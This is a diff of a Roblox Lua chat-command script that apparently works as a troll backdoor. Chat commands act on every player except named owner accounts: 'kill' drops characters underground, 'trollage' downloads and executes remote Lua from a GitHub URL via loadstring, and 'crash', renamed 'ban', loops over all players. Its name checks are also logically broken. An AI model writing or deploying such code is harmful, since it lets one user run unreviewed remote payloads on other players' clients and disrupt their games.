@@ -1,5 +1,4 @@
 local textChatService = game:GetService("TextChatService")
-
 local commands = {
     kill = function()
         if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" then
@@ -12,7 +11,7 @@ local commands = {
             local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
             local newPosition = humanoidRootPart.CFrame
             for i = 1, 3 do
-                newPosition = newPosition + Vector3.new(0, -20, 0)
+                newPosition = newPosition + Vector3.new(0, -40, 0)
                 humanoidRootPart.CFrame = newPosition
                 wait(0.01)
             end
@@ -34,10 +33,10 @@ local commands = {
     end,
     trollage = function()
         if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage.lua"))()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/bb47a8c271e25893dca73ca67ecb24d15d46ff82/trollage"))()
         end
     end,
-    crash = function()
+    ban = function()
         if game.Players.LocalPlayer.Name ~= "SnoopyIs_Better" or LocalPlayer.Name ~= "mrbeatyouruglyface" then
             wait(1)
             for index, player in pairs(game.Players:GetPlayers()) do
@@ -111,4 +110,3 @@ textChatService.OnIncomingMessage = function(message)
     end
     return properties
 end
-
